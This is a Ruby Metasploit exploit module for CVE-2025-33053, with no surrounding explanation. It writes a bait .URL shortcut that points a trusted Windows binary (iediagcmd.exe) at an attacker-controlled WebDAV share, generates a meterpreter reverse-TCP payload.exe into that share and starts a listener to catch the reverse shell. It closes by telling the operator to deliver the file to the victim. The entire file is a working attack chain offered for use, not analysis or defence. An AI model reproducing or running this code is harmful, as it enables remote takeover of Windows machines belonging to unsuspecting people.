require 'msf/core'
require 'fileutils'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2025-33053 Exploit via Malicious .URL File and WebDAV',
      'Description'    => %q{
        This module creates a malicious .URL file that abuses CVE-2025-33053,
        optionally sets up a WebDAV server, generates a payload, places it into
        the WebDAV directory, and can launch a listener automatically.
      },
      'Author'         => ['Dev Bui Hieu'],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2025-06-11',
      'References'     => [
        ['CVE', '2025-33053'],
        ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept']
      ]
    ))

    register_options(
      [
        OptString.new('LHOST', [true, 'Local host for reverse connection']),
        OptInt.new('LPORT', [true, 'Local port for reverse connection', 4444]),
        OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/x64/meterpreter/reverse_tcp']),
        OptBool.new('GEN_PAYLOAD', [true, 'Generate payload and move to WebDAV directory', true]),
        OptBool.new('START_LISTENER', [true, 'Start handler after setup', true]),
        OptString.new('WEBDAV_DIR', [true, 'WebDAV directory path', '/var/www/webdav']),
        OptString.new('OUTFILE', [true, 'Output URL file name', 'bait.url']),
        OptString.new('LOLBAS_EXE', [true, 'Path to trusted binary (LOLBAS)', 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe']),
        OptString.new('ICON_PATH', [true, 'Icon file path', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']),
        OptInt.new('ICON_INDEX', [true, 'Icon index in icon file', 13]),
        OptString.new('MODIFIED_HEX', [true, 'Modified timestamp in hex', '20F06BA06D07BD014D'])
      ]
    )
  end

  def run
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    payload_type = datastore['PAYLOAD']
    webdav_dir = datastore['WEBDAV_DIR']
    gen_payload = datastore['GEN_PAYLOAD']
    start_listener = datastore['START_LISTENER']

    print_status("Creating WebDAV directory if not exists...")
    FileUtils.mkdir_p(webdav_dir) unless File.directory?(webdav_dir)

    if gen_payload
      exe_path = File.join(webdav_dir, 'payload.exe')
      print_good("Generating payload at: #{exe_path}")
      generate_payload_exe(payload_type, lhost, lport, exe_path)
    end

    unc_path = "\\\\#{lhost}\\#{File.basename(webdav_dir)}\\"
    url_content = <<~EOF
      [InternetShortcut]
      URL=#{datastore['LOLBAS_EXE']}
      WorkingDirectory=#{unc_path}
      ShowCommand=7
      IconIndex=#{datastore['ICON_INDEX']}
      IconFile=#{datastore['ICON_PATH']}
      Modified=#{datastore['MODIFIED_HEX']}
    EOF

    url_file = File.join(Msf::Config.local_directory, datastore['OUTFILE'])
    File.write(url_file, url_content)
    print_good(".URL file written to: #{url_file}")

    if start_listener
      print_status("Starting handler as background job...")
      handler = framework.exploits.create('multi/handler')
      handler.datastore['PAYLOAD'] = payload_type
      handler.datastore['LHOST'] = lhost
      handler.datastore['LPORT'] = lport
      handler.exploit_simple('RunAsJob' => true)
    end

    print_status("Module complete. Deliver #{url_file} to victim.")
  end

  def generate_payload_exe(payload, lhost, lport, output_path)
    exe = framework.payloads.create(payload)
    exe.datastore['LHOST'] = lhost
    exe.datastore['LPORT'] = lport
    raw = exe.generate
    exe_file = Rex::Text.to_win32pe(raw, exe.arch)
    File.open(output_path, 'wb') { |f| f.write(exe_file) }
  end
end
